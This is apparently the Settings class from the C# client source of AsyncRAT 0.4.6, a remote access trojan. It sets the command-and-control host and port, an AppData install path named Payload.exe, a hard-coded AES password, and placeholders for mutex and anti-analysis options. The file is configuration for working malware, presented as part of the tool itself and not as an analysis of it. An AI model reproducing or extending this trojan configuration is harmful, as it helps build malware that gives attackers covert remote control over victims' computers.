using Client.Cryptography;
using System;
using System.IO;

namespace Client
{
    public static class Settings
    {
        public static readonly string Ports = "6606";
        public static readonly string Host = "127.0.0.1";
        public static readonly string Version = "AsyncRAT 0.4.6";
        public static readonly string Install = "false";
        public static readonly string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
        public static readonly string Password = "NYAN CAT";
        public static readonly Aes256 aes256 = new Aes256(Password);
        public static readonly string MTX = "%MTX%";
#if DEBUG
        public static readonly string Anti = "false";
#else
        public static readonly string Anti = "%Anti%";
#endif
    }
}